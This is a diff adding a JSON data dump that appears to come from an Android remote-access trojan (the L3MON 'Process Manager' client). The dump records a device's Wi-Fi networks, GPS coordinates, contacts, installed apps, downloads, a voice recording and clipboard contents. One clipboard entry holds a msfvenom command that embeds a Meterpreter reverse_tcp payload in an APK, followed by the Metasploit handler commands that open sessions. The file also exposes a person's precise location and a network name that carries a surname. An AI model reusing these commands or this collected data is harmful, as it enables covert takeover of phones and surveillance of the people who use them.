@@ -1,0 +1,1020 @@
+{
+  "clientID": "476900f8170a40b3",
+  "CommandQue": [
+    {
+      "type": "0xWI",
+      "uid": 1046
+    },
+    {
+      "type": "0xCO",
+      "uid": 9658
+    },
+    {
+      "type": "0xPM",
+      "uid": 6395
+    }
+  ],
+  "SMSData": [],
+  "CallData": [],
+  "contacts": [
+    {
+      "phoneNo": "112",
+      "name": "Distress Number",
+      "hash": "3924c7c8836ea5e47a889b61a038742e"
+    },
+    {
+      "phoneNo": "1800-300-1947",
+      "name": "UIDAI",
+      "hash": "e2753cdb0540fcc6d9588f41e1464423"
+    }
+  ],
+  "wifiNow": [
+    {
+      "BSSID": "5c:8c:30:30:96:39",
+      "SSID": "KUMAR KADAM",
+      "firstSeen": "2022-10-01T14:26:20.466Z",
+      "lastSeen": "2022-10-01T14:26:20.467Z"
+    },
+    {
+      "BSSID": "5c:8c:30:30:96:3d",
+      "SSID": "KUMAR KADAM_5G",
+      "firstSeen": "2022-10-01T14:26:20.468Z",
+      "lastSeen": "2022-10-01T14:26:20.468Z"
+    },
+    {
+      "BSSID": "5e:8c:30:40:96:39",
+      "SSID": "",
+      "firstSeen": "2022-10-01T14:26:20.469Z",
+      "lastSeen": "2022-10-01T14:26:20.469Z"
+    },
+    {
+      "BSSID": "e2:37:bf:0a:da:42",
+      "SSID": "DIRECT-8j",
+      "firstSeen": "2022-10-01T14:26:20.479Z",
+      "lastSeen": "2022-10-01T14:26:20.479Z"
+    },
+    {
+      "BSSID": "d8:0d:17:f4:24:80",
+      "SSID": "Bigzero_Guest",
+      "firstSeen": "2022-10-01T14:26:20.480Z",
+      "lastSeen": "2022-10-01T14:26:20.480Z"
+    }
+  ],
+  "wifiLog": [
+    {
+      "BSSID": "5c:8c:30:30:96:39",
+      "SSID": "KUMAR KADAM",
+      "firstSeen": "2022-10-01T14:26:20.466Z",
+      "lastSeen": "2022-10-01T14:26:20.467Z"
+    },
+    {
+      "BSSID": "5c:8c:30:30:96:3d",
+      "SSID": "KUMAR KADAM_5G",
+      "firstSeen": "2022-10-01T14:26:20.468Z",
+      "lastSeen": "2022-10-01T14:26:20.468Z"
+    },
+    {
+      "BSSID": "5e:8c:30:40:96:39",
+      "SSID": "",
+      "firstSeen": "2022-10-01T14:26:20.469Z",
+      "lastSeen": "2022-10-01T14:26:20.469Z"
+    },
+    {
+      "BSSID": "e2:37:bf:0a:da:42",
+      "SSID": "DIRECT-8j",
+      "firstSeen": "2022-10-01T14:26:20.479Z",
+      "lastSeen": "2022-10-01T14:26:20.479Z"
+    },
+    {
+      "BSSID": "d8:0d:17:f4:24:80",
+      "SSID": "Bigzero_Guest",
+      "firstSeen": "2022-10-01T14:26:20.480Z",
+      "lastSeen": "2022-10-01T14:26:20.480Z"
+    }
+  ],
+  "clipboardLog": [
+    {
+      "time": "2022-10-01T14:31:14.966Z",
+      "content": "https://toffeeshare.com/c/c-dcBLGMMs"
+    },
+    {
+      "time": "2022-10-01T14:31:28.224Z",
+      "content": "ifconfig     ---toceake ip\n\nsudo  msfvenom -x ChessO.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.40 lport=6789 -o puthavi.apk \n\n                                         * open metasploid*\n\nuse exploid/multi/handler\n\nset PAYLOAD android/meterpreter/reverse_tcp\n\nset LHOST ..YOUR IP..\n\nset LPORT 4444\n\nrun -j\n\nsessions"
+    }
+  ],
+  "notificationLog": [],
+  "enabledPermissions": [
+    "android.permission.WAKE_LOCK",
+    "android.permission.CAMERA",
+    "android.permission.WRITE_EXTERNAL_STORAGE",
+    "android.permission.INTERNET",
+    "android.permission.ACCESS_NETWORK_STATE",
+    "android.permission.READ_SMS",
+    "android.permission.SEND_SMS",
+    "android.permission.ACCESS_WIFI_STATE",
+    "android.permission.RECEIVE_BOOT_COMPLETED",
+    "android.permission.READ_PHONE_STATE",
+    "android.permission.READ_EXTERNAL_STORAGE",
+    "android.permission.READ_CALL_LOG",
+    "android.permission.RECORD_AUDIO",
+    "android.permission.MODIFY_AUDIO_SETTINGS",
+    "android.permission.ACCESS_COARSE_LOCATION",
+    "android.permission.ACCESS_FINE_LOCATION",
+    "android.permission.READ_CONTACTS"
+  ],
+  "apps": [
+    {
+      "appName": "FM Radio",
+      "packageName": "com.android.fmradio",
+      "versionName": "2.0",
+      "versionCode": 2
+    },
+    {
+      "appName": "com.android.cts.priv.ctsshim",
+      "packageName": "com.android.cts.priv.ctsshim",
+      "versionName": "7.0-2996264",
+      "versionCode": 24
+    },
+    {
+      "appName": "YouTube",
+      "packageName": "com.google.android.youtube",
+      "versionName": "17.34.35",
+      "versionCode": 1531305408
+    },
+    {
+      "appName": "Android Services Library",
+      "packageName": "com.google.android.ext.services",
+      "versionName": "1",
+      "versionCode": 1
+    },
+    {
+      "appName": "Mobile Network Configuration",
+      "packageName": "com.android.providers.telephony",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Settings",
+      "packageName": "com.android.wantjoin.settings",
+      "versionName": "0.1.2018.03.05.01",
+      "versionCode": 1
+    },
+    {
+      "appName": "Google",
+      "packageName": "com.google.android.googlequicksearchbox",
+      "versionName": "13.20.11.23.arm64",
+      "versionCode": 301197107
+    },
+    {
+      "appName": "Camera",
+      "packageName": "com.mediatek.camera",
+      "versionName": "1.1.40030",
+      "versionCode": 40030
+    },
+    {
+      "appName": "Calendar Storage",
+      "packageName": "com.android.providers.calendar",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "LenovoLauncherProvider",
+      "packageName": "com.lenovo.launcher.provider",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Telegram",
+      "packageName": "org.telegram.messenger",
+      "versionName": "9.0.2",
+      "versionCode": 28082
+    },
+    {
+      "appName": "Media Storage",
+      "packageName": "com.android.providers.media",
+      "versionName": "7.0",
+      "versionCode": 801
+    },
+    {
+      "appName": "RawDataTest",
+      "packageName": "com.goodix.rawdata",
+      "versionName": "v1.8.0.5",
+      "versionCode": 1
+    },
+    {
+      "appName": "Google One Time Init",
+      "packageName": "com.google.android.onetimeinitializer",
+      "versionName": "7.0-3037786",
+      "versionCode": 24
+    },
+    {
+      "appName": "FwkPlugin",
+      "packageName": "com.mediatek.fwk.plugin",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Android Shared Library",
+      "packageName": "com.google.android.ext.shared",
+      "versionName": "1",
+      "versionCode": 1
+    },
+    {
+      "appName": "com.android.wallpapercropper",
+      "packageName": "com.android.wallpapercropper",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Safe Browser",
+      "packageName": "com.wantjoin.safeBrowser",
+      "versionName": "0.1.2018.02.07.01",
+      "versionCode": 10
+    },
+    {
+      "appName": "Schedule power on & off",
+      "packageName": "com.mediatek.schpwronoff",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Documents",
+      "packageName": "com.android.documentsui",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "External Storage",
+      "packageName": "com.android.externalstorage",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Process Manager",
+      "packageName": "com.etechd.l3mon",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "YGPS",
+      "packageName": "com.mediatek.ygps",
+      "versionName": "1.1",
+      "versionCode": 2
+    },
+    {
+      "appName": "SimProcessor",
+      "packageName": "com.mediatek.simprocessor",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "HTML Viewer",
+      "packageName": "com.android.htmlviewer",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "MmsService",
+      "packageName": "com.android.mms.service",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Download Manager",
+      "packageName": "com.android.providers.downloads",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "EngineerMode",
+      "packageName": "com.mediatek.engineermode",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Material Files",
+      "packageName": "me.zhanghai.android.files",
+      "versionName": "1.5.2",
+      "versionCode": 31
+    },
+    {
+      "appName": "Lenovo TAB 8",
+      "packageName": "com.lenovo.tab8",
+      "versionName": "1.0.4",
+      "versionCode": 104
+    },
+    {
+      "appName": "Search Applications Provider",
+      "packageName": "com.android.providers.applications",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "ConfigUpdater",
+      "packageName": "com.google.android.configupdater",
+      "versionName": "7.0-3037786",
+      "versionCode": 24
+    },
+    {
+      "appName": "Lenovo ID",
+      "packageName": "com.lenovo.lsf",
+      "versionName": "V4.2.7.4714tr",
+      "versionCode": 7004714
+    },
+    {
+      "appName": "System Update",
+      "packageName": "com.lenovo.ota",
+      "versionName": "V7.0.13.20180612",
+      "versionCode": 999000002
+    },
+    {
+      "appName": "Package Access Helper",
+      "packageName": "com.android.defcontainer",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Downloads",
+      "packageName": "com.android.providers.downloads.ui",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Google Play Store",
+      "packageName": "com.android.vending",
+      "versionName": "29.7.17-21 [0] [PR] 434919747",
+      "versionCode": 82971710
+    },
+    {
+      "appName": "PacProcessor",
+      "packageName": "com.android.pacprocessor",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Certificate Installer",
+      "packageName": "com.android.certinstaller",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "com.android.carrierconfig",
+      "packageName": "com.android.carrierconfig",
+      "versionName": "1.0.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Android Accessibility Suite",
+      "packageName": "com.google.android.marvin.talkback",
+      "versionName": "12.2.0.442723463",
+      "versionCode": 60123274
+    },
+    {
+      "appName": "File Manager",
+      "packageName": "lenovo.filemanager",
+      "versionName": "1.1",
+      "versionCode": 2
+    },
+    {
+      "appName": "Android System",
+      "packageName": "android",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Common Data Service",
+      "packageName": "com.mediatek.connectivity",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Contacts",
+      "packageName": "com.android.contacts",
+      "versionName": "1.4.17",
+      "versionCode": 10417
+    },
+    {
+      "appName": "Lenovo Launcher",
+      "packageName": "com.tblenovo.launcher",
+      "versionName": "V1.2.7.180205",
+      "versionCode": 1020007
+    },
+    {
+      "appName": "Android Easter Egg",
+      "packageName": "com.android.egg",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "MTP Host",
+      "packageName": "com.android.mtp",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "com.android.backupconfirm",
+      "packageName": "com.android.backupconfirm",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "BT Tool",
+      "packageName": "com.mediatek.bluetooth.dtt",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "com.archer.providers.autoboot",
+      "packageName": "com.archer.providers.autoboot",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Intent Filter Verification Service",
+      "packageName": "com.android.statementservice",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Gmail",
+      "packageName": "com.google.android.gm",
+      "versionName": "2022.08.21.473115440.Release",
+      "versionCode": 63439432
+    },
+    {
+      "appName": "DRM-Protected Content Storage",
+      "packageName": "com.mediatek.providers.drm",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "FactoryKit Test",
+      "packageName": "com.huaqin.factory",
+      "versionName": "A2060_201812041440",
+      "versionCode": 1
+    },
+    {
+      "appName": "Google Zhuyin Input",
+      "packageName": "com.google.android.apps.inputmethod.zhuyin",
+      "versionName": "2.4.3.140325353-arm64-v8a",
+      "versionCode": 2430316
+    },
+    {
+      "appName": "Setup Wizard",
+      "packageName": "com.google.android.setupwizard",
+      "versionName": "224.3779664",
+      "versionCode": 224
+    },
+    {
+      "appName": "Settings Storage",
+      "packageName": "com.android.providers.settings",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "com.android.providers.partnerbrowsercustomizations",
+      "packageName": "com.android.providers.partnerbrowsercustomizations",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "com.android.sharedstoragebackup",
+      "packageName": "com.android.sharedstoragebackup",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "com.mediatek.batterywarning",
+      "packageName": "com.mediatek.batterywarning",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "com.huaqin.lenovoprivacy",
+      "packageName": "com.huaqin.lenovoprivacy",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Google Play Music",
+      "packageName": "com.google.android.music",
+      "versionName": "8.6.6626-1.Z",
+      "versionCode": 66261
+    },
+    {
+      "appName": "Print Spooler",
+      "packageName": "com.android.printspooler",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Dolby",
+      "packageName": "com.dolby.dax2appUI",
+      "versionName": "DAX2.4.0.16_r1",
+      "versionCode": 1
+    },
+    {
+      "appName": "Basic Daydreams",
+      "packageName": "com.android.dreams.basic",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "com.lenovo.acttab",
+      "packageName": "com.lenovo.acttab",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Input Devices",
+      "packageName": "com.android.inputdevices",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "UserExperience",
+      "packageName": "com.lenovo.ue.device",
+      "versionName": "8.5.3-gd733cc9-ROW-COMPAT",
+      "versionCode": 8050003
+    },
+    {
+      "appName": "AppHideService",
+      "packageName": "com.huaqin.apphide",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Multi-User",
+      "packageName": "com.android.wantjoin.childmode.ctrl",
+      "versionName": "0.1.2018.03.05.01",
+      "versionCode": 1
+    },
+    {
+      "appName": "com.mediatek",
+      "packageName": "com.mediatek",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "MusicFX",
+      "packageName": "com.android.musicfx",
+      "versionName": "1.4",
+      "versionCode": 10400
+    },
+    {
+      "appName": "Drive",
+      "packageName": "com.google.android.apps.docs",
+      "versionName": "2.22.377.1.all.alldpi",
+      "versionCode": 212873028
+    },
+    {
+      "appName": "Maps",
+      "packageName": "com.google.android.apps.maps",
+      "versionName": "11.48.0801",
+      "versionCode": 1066697795
+    },
+    {
+      "appName": "File Manager",
+      "packageName": "com.chaozhuo.filemanager",
+      "versionName": "3.1.5",
+      "versionCode": 31500
+    },
+    {
+      "appName": "Android System WebView",
+      "packageName": "com.google.android.webview",
+      "versionName": "0.0.0.1",
+      "versionCode": 100
+    },
+    {
+      "appName": "Device Service",
+      "packageName": "com.lenovo.lsf.device",
+      "versionName": "V4.8.0.2494trn",
+      "versionCode": 408002494
+    },
+    {
+      "appName": "Call Management",
+      "packageName": "com.android.server.telecom",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Google Contacts Sync",
+      "packageName": "com.google.android.syncadapters.contacts",
+      "versionName": "7.0-3787403",
+      "versionCode": 24
+    },
+    {
+      "appName": "Trusted Face",
+      "packageName": "com.android.facelock",
+      "versionName": "7.0-3037786",
+      "versionCode": 24
+    },
+    {
+      "appName": "Key Chain",
+      "packageName": "com.android.keychain",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Chrome",
+      "packageName": "com.android.chrome",
+      "versionName": "105.0.5195.136",
+      "versionCode": 519513623
+    },
+    {
+      "appName": "Package installer",
+      "packageName": "com.google.android.packageinstaller",
+      "versionName": "7.0-4377972",
+      "versionCode": 24
+    },
+    {
+      "appName": "Google Play services",
+      "packageName": "com.google.android.gms",
+      "versionName": "22.33.16 (040400-474895102)",
+      "versionCode": 223316019
+    },
+    {
+      "appName": "Google Services Framework",
+      "packageName": "com.google.android.gsf",
+      "versionName": "7.0-3037786",
+      "versionCode": 24
+    },
+    {
+      "appName": "Speech Services by Google",
+      "packageName": "com.google.android.tts",
+      "versionName": "googletts.google-speech-apk_20220822.02_p0.469315275",
+      "versionCode": 210392765
+    },
+    {
+      "appName": "Call Log Backup/Restore",
+      "packageName": "com.android.calllogbackup",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Google Partner Set Up",
+      "packageName": "com.google.android.partnersetup",
+      "versionName": "7.0-4160035",
+      "versionCode": 24
+    },
+    {
+      "appName": "countrylist-V2.0",
+      "packageName": "com.huaqin.countrylist",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Google Play Movies & TV",
+      "packageName": "com.google.android.videos",
+      "versionName": "3.28.14",
+      "versionCode": 32800141
+    },
+    {
+      "appName": "ProxyHandler",
+      "packageName": "com.android.proxyhandler",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Market Feedback Agent",
+      "packageName": "com.google.android.feedback",
+      "versionName": "7.0-3037786",
+      "versionCode": 24
+    },
+    {
+      "appName": "Print Service Recommendation Service",
+      "packageName": "com.google.android.printservice.recommendation",
+      "versionName": "1.0.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Photos",
+      "packageName": "com.google.android.apps.photos",
+      "versionName": "6.8.0.475691616",
+      "versionCode": 45011685
+    },
+    {
+      "appName": "Calendar",
+      "packageName": "com.google.android.calendar",
+      "versionName": "2022.36.0-472143158-release",
+      "versionCode": 2017106948
+    },
+    {
+      "appName": "Work profile setup",
+      "packageName": "com.android.managedprovisioning",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "VCalendar",
+      "packageName": "com.mediatek.calendarimporter",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Atci_service",
+      "packageName": "com.mediatek.atci.service",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Yandex",
+      "packageName": "ru.yandex.searchplugin",
+      "versionName": "7.21",
+      "versionCode": 70201001
+    },
+    {
+      "appName": "Demo mode",
+      "packageName": "com.motorola.demo",
+      "versionName": "20180126",
+      "versionCode": 231006
+    },
+    {
+      "appName": "MTK Thermal Manager",
+      "packageName": "com.mediatek.thermalmanager",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "com.android.providers.partnerbookmarks",
+      "packageName": "com.android.providers.partnerbookmarks",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Google Account Manager",
+      "packageName": "com.google.android.gsf.login",
+      "versionName": "7.0-3037786",
+      "versionCode": 24
+    },
+    {
+      "appName": "SimRecoveryTestTool",
+      "packageName": "com.mtk.telephony",
+      "versionName": "1.0",
+      "versionCode": 1
+    },
+    {
+      "appName": "Live Wallpaper Picker",
+      "packageName": "com.android.wallpaper.livepicker",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Lenovo Weather",
+      "packageName": "com.tblenovo.lewea",
+      "versionName": "V3.8.78.171107",
+      "versionCode": 3080078
+    },
+    {
+      "appName": "SetupWizardExt",
+      "packageName": "com.tblenovo.setup",
+      "versionName": "V2.1.53.180928",
+      "versionCode": 2010019
+    },
+    {
+      "appName": "Dolby Service",
+      "packageName": "com.dolby",
+      "versionName": "DAX2.4.0.16_r1",
+      "versionCode": 2
+    },
+    {
+      "appName": "Google Korean Input",
+      "packageName": "com.google.android.inputmethod.korean",
+      "versionName": "1.5.0.125756861-preload-arm64-v8a",
+      "versionCode": 1500909
+    },
+    {
+      "appName": "Google Backup Transport",
+      "packageName": "com.google.android.backuptransport",
+      "versionName": "7.0-3037786",
+      "versionCode": 24
+    },
+    {
+      "appName": "Bookmark Provider",
+      "packageName": "com.android.bookmarkprovider",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Settings",
+      "packageName": "com.android.settings",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Calculator",
+      "packageName": "com.android.calculator2",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "com.huaqin.factoryservice",
+      "packageName": "com.huaqin.factoryservice",
+      "versionName": "2.0.3",
+      "versionCode": 203
+    },
+    {
+      "appName": "com.android.cts.ctsshim",
+      "packageName": "com.android.cts.ctsshim",
+      "versionName": "7.0-2996264",
+      "versionCode": 24
+    },
+    {
+      "appName": "VpnDialogs",
+      "packageName": "com.android.vpndialogs",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Hangouts",
+      "packageName": "com.google.android.talk",
+      "versionName": "41.0.411169071",
+      "versionCode": 27382038
+    },
+    {
+      "appName": "Mobile Data",
+      "packageName": "com.android.phone",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Shell",
+      "packageName": "com.android.shell",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Yandex Browser",
+      "packageName": "com.yandex.browser",
+      "versionName": "17.11.1.632",
+      "versionCode": 1711106322
+    },
+    {
+      "appName": "com.android.wallpaperbackup",
+      "packageName": "com.android.wallpaperbackup",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Blocked Numbers Storage",
+      "packageName": "com.android.providers.blockednumber",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "User Dictionary",
+      "packageName": "com.android.providers.userdictionary",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Emergency information",
+      "packageName": "com.android.emergency",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Fused Location",
+      "packageName": "com.android.location.fused",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Clock",
+      "packageName": "com.android.deskclock",
+      "versionName": "4.5.0",
+      "versionCode": 450
+    },
+    {
+      "appName": "System UI",
+      "packageName": "com.android.systemui",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Bluetooth MIDI Service",
+      "packageName": "com.android.bluetoothmidiservice",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "MTKLogger",
+      "packageName": "com.mediatek.mtklogger",
+      "versionName": "5.0.0",
+      "versionCode": 40000
+    },
+    {
+      "appName": "SensorHub",
+      "packageName": "com.mediatek.sensorhub.ui",
+      "versionName": "2.0",
+      "versionCode": 2
+    },
+    {
+      "appName": "Bluetooth Share",
+      "packageName": "com.android.bluetooth",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Contacts Storage",
+      "packageName": "com.android.providers.contacts",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "CaptivePortalLogin",
+      "packageName": "com.android.captiveportallogin",
+      "versionName": "7.0",
+      "versionCode": 24
+    },
+    {
+      "appName": "Sound Recorder",
+      "packageName": "com.tblenovo.soundrecorder",
+      "versionName": "V2.0.34.180227",
+      "versionCode": 2000031
+    },
+    {
+      "appName": "Gboard",
+      "packageName": "com.google.android.inputmethod.latin",
+      "versionName": "12.1.06.463429027-release-arm64-v8a",
+      "versionCode": 92291422
+    }
+  ],
+  "GPSData": [
+    {
+      "time": "2022-10-01T14:29:30.830Z",
+      "enabled": true,
+      "latitude": 18.6331944,
+      "longitude": 73.798737,
+      "altitude": 0,
+      "accuracy": 39.599998474121094,
+      "speed": 0
+    },
+    {
+      "time": "2022-10-01T17:53:01.998Z",
+      "enabled": true,
+      "latitude": 18.6332622,
+      "longitude": 73.7986865,
+      "altitude": 509.8999938964844,
+      "accuracy": 36.06700134277344,
+      "speed": 0
+    }
+  ],
+  "GPSSettings": {
+    "updateFrequency": 0
+  },
+  "downloads": [
+    {
+      "time": "2022-10-01T14:29:00.034Z",
+      "type": "download",
+      "originalName": "wifi1.py",
+      "path": "/client_downloads/257c2-7bc0-e000e.py"
+    },
+    {
+      "time": "2022-10-01T14:30:16.375Z",
+      "type": "voiceRecord",
+      "originalName": "sound1742337230.mp3",
+      "path": "/client_downloads/67764-7c84-fa9f9.mp3"
+    },
+    {
+      "time": "2022-10-01T17:53:02.554Z",
+      "type": "download",
+      "originalName": "remove-exif.py",
+      "path": "/client_downloads/08d19-8cc9-67ac1.py"
+    },
+    {
+      "time": "2022-10-01T17:54:48.522Z",
+      "type": "download",
+      "originalName": "CHEMISTRY.pdf",
+      "path": "/client_downloads/48049-6c2e-6a7b9.pdf"
+    },
+    {
+      "time": "2022-10-01T17:55:02.725Z",
+      "type": "download",
+      "originalName": "CHEMISTRY.pdf",
+      "path": "/client_downloads/8b774-7af0-c818c.pdf"
+    }
+  ],
+  "currentFolder": [
+    {
+      "name": "../",
+      "isDir": true,
+      "path": "/storage/emulated/0"
+    },
+    {
+      "name": "me.twrp.twrpapp-26.apk",
+      "isDir": false,
+      "path": "/storage/emulated/0/Download/me.twrp.twrpapp-26.apk"
+    },
+    {
+      "name": "CHEMISTRY.pdf",
+      "isDir": false,
+      "path": "/storage/emulated/0/Download/CHEMISTRY.pdf"
+    },
+    {
+      "name": "YouTube_v17.10.34_mod_apkdone.com.apk",
+      "isDir": false,
+      "path": "/storage/emulated/0/Download/YouTube_v17.10.34_mod_apkdone.com.apk"
+    }
+  ]
+}
